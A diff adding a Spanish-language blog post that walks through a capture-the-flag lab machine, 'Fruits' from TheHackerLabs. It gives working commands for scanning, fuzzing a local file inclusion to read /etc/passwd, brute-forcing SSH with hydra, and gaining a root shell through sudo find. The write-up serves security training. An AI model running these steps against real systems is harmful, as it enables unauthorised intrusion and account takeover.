@@ -1,0 +1,102 @@
+---
+layout: post
+title: "Fruits"
+date: 2024-06-03 13:05:23
+category: sample
+vm: hackerlabs
+---
+
+<style>
+  .post-content {
+    color: #51c25be1; /* Cambia el color del texto */
+  }
+</style>
+
+<table class="log">
+  <tr>
+    <td rowspan="5"><img src="/notas/public/img/thehackerlabs/thehackerlabs.png" width=260></td>
+    <td></td>
+  </tr>
+  <tr> <td><strong>Máquina:</strong> Fruits </td> </tr>
+  <tr> <td><strong>SO:</strong> Linux</td> </tr>
+  <tr> <td><strong>Dificultad:</strong> <span class="easy">Facil</span></td> </tr>
+  <tr> <td><strong><a href="https://thehackerslabs.com/fruits/" target="_blank"> Descarga</a></strong></td> </tr>
+</table>
+
+<br>
+
+![img](/notas/public/img/thehackerlabs/Fruits/host.png){:.margin}
+
+**1\.** Descubriendo dispositivos en la red.
+
+`sudo arp-scan -I enp2s0 --localnet`
+
+![img](/notas/public/img/thehackerlabs/Fruits/arp.png){:.margin}
+
+**2\.** Escaneando puertos y servicios disponibles.
+
+`sudo nmap -p- --open -sCV -T5 --min-rate=5000 192.168.1.5 -Pn -n`
+
+![img](/notas/public/img/thehackerlabs/Fruits/nmap.png){:.margin}
+
+**3\.** En la web tenemos un buscador, que me lleva a un php pero sin mas.
+
+`http://192.168.1.5:80`
+
+![img](/notas/public/img/thehackerlabs/Fruits/80.png){:.margin}
+![img](/notas/public/img/thehackerlabs/Fruits/80redirect.png){:.margin}
+
+**4\.** Descubriendo directorios y archivos en el servidor web.
+
+`gobuster dir -u http://192.168.1.5/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html -q`
+
+![img](/notas/public/img/thehackerlabs/Fruits/gobuster.png){:.margin}
+
+**5\.** Fuzzeando parametros para un LFI.
+
+`wfuzz -c --hc=404 --hl=1 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt 'http://192.168.1.5/fruits.php?FUZZ=/etc/passwd' 2>/dev/null | grep -vE 'Target:|\*|Total'`
+
+![img](/notas/public/img/thehackerlabs/Fruits/wfuzz.png){:.margin}
+
+**6\.** Comprobando a que efectivamente se de un LFI.
+
+`http://192.168.1.5/fruits.php?file=/etc/passwd`
+
+![img](/notas/public/img/thehackerlabs/Fruits/etcpasswd.png){:.margin}
+
+**7\.** Tengo dos usuarios disponibles en la maquina.
+
+`view-source:http://192.168.1.5/fruits.php?file=/etc/passwd`
+
+![img](/notas/public/img/thehackerlabs/Fruits/users.png){:.margin}
+
+**8\.** Haciendo fuerza bruta al ssh.
+
+`hydra -l bananaman -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.5`
+
+![img](/notas/public/img/thehackerlabs/Fruits/hydra.png){:.margin}
+
+**9\.** Me conecto como usuario bananaman.
+
+`ssh bananaman@192.168.1.5`
+
+![img](/notas/public/img/thehackerlabs/Fruits/ssh.png){:.margin}
+
+**10\.** Revisando permisos sudo.
+
+`sudo -l`
+
+![img](/notas/public/img/thehackerlabs/Fruits/sudol.png){:.margin}
+
+**11\.** Escalando privilegios.
+
+_\- Busco en [gtfobins](https://gtfobins.github.io/gtfobins/find/#sudo) la forma de escalar con este binario._
+
+````sudo find . -exec /bin/sh \; -quit````
+
+![img](/notas/public/img/thehackerlabs/Fruits/root.png){:.margin}
+
+
+<br>
+
+<span class="finish">_Finalizado._</span>
